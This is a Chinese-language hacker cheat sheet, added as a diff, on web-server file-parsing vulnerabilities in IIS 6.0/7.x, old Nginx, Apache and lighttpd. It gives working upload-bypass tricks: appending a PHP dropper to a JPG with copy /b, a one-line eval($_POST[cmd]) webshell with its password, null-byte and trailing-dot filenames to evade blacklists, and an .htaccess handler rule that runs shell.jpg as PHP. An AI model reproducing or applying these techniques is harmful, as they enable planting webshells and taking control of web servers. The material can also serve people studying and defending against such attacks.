@@ -1,0 +1,72 @@
+解析漏洞总结
+
+Author:laterain
+From:90sec
+------------------------------------------------------------------------
+IIS 6.0
+
+目录解析：/xx.asp/xx.jpg  xx.jpg可替换为任意文本文件(e.g. xx.txt)，文本内容为后门代码
+IIS6.0 会将 xx.jpg 解析为 asp 文件。
+后缀解析：/xx.asp;.jpg     /xx.asp:.jpg(此处需抓包修改文件名)
+IIS6.0 都会把此类后缀文件成功解析为 asp 文件。
+默认解析：/xx.asa    /xx.cer   /xx.cdx
+IIS6.0 默认的可执行文件除了 asp 还包含这三种
+此处可联系利用目录解析漏洞 /xx.asa/xx.jpg 或 /xx.cer/xx.jpg 或 xx.asa;.jpg
+
+
+--------------------------------------
+
+IIS 7.0/IIS 7.5/Nginx <8.03
+
+
+在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.php会将 /xx.jpg/xx.php 解析为 php 文件。
+常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾 
+e.g.  
+copy xx.jpg/b + yy.txt/a xy.jpg
+/b 即二进制[binary]模式
+/a 即ascii模式 xx.jpg正常图片文件 
+yy.txt 内容 <?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd])?>');?>
+意思为写入一个内容为 <?php eval($_POST[cmd])?> 名称为shell.php的文件
+找个地方上传 xy.jpg ,然后找到 xy.jpg 的地址，在地址后加上 /xx.php 即可执行恶意文本。
+.然后就在图片目录下生成一句话木马 shell.php 密码 cmd 
+
+
+--------------------------------------
+Nginx <8.03
+
+在Fast-CGI关闭的情况下，Nginx <8.03依然存在解析漏洞
+在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。
+
+
+
+Apache
+
+后缀解析：test.php.x1.x2.x3 
+Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析 
+test.php.x1.x2.x3 则会被解析为php
+经验之谈：php|php3|phtml 多可被Apache解析
+
+
+
+其他一些可利用的
+在windows环境下，xx.jpg[空格] 或xx.jpg. 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，这也是可以被利用的！
+在向一台windows主机上传数据时，你可以抓包修改文件名，在后面加个空格或点，试图绕过黑名单，若上传成功，最后的点或空格都会被消除，这样就可得到shell。
+我记得Fck Php 2.6就存在加空格绕过的漏洞。{Linux主机中不行，Linux允许这类文件存在}
+如果在Apache中.htaccess可被执行（默认不执行，这是90sec里的一位朋友说的，当初我并不知道），且可以被上传，
+那可以尝试在.htaccess中写入:
+<FilesMatch “shell.jpg”> SetHandler application/x-httpd-php </FilesMatch>
+shell.jpg换成你上传的文件，这样shell.jpg就可解析为php文件 
+
+
+------------------------
+
+[+]lighttpd
+xx.jpg/xx.php 
+[Add by loser]
+
+
+
+后面自己补充：
+
+
+ 
